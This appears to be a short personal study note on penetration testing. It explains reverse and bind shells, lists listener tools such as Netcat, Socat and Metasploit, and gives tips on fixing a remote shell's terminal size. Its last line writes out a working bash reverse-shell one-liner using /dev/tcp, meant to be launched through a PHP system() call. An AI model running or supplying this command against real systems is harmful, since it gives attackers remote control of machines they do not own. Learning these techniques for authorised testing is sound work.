2 types of shells:
- Reverse shells: target connects to your pc - generally better
- Bind shells: your pc connects to target

- Metasploit:  [[3 Tools/Metasploit framework/msfvenom]]: one stop shop for all kind of payloads
# reverse shell receivers
- [[3 Tools/shells/Netcat]]: simple, by default very unstable
- [[3 Tools/shells/Socat]]: very powerful, but difficult to use
- Metasploit - multi/handler: very stable
# general tips:
manually adjust tty size, to be able to use editors,...:
`stty -a` for tty info (run in your own terminal)
then set the same values for remote shell on target machine:
`stty rows <number>`  
and
`stty cols <number>`

If you create shell using e.g. a php system() call it is sometimes necessary to first start a full bash process and then start the reverse shell inside that bash process: `bash -c "bash -i >& /dev/tcp/192.168.x.x/4444 0>&1"`
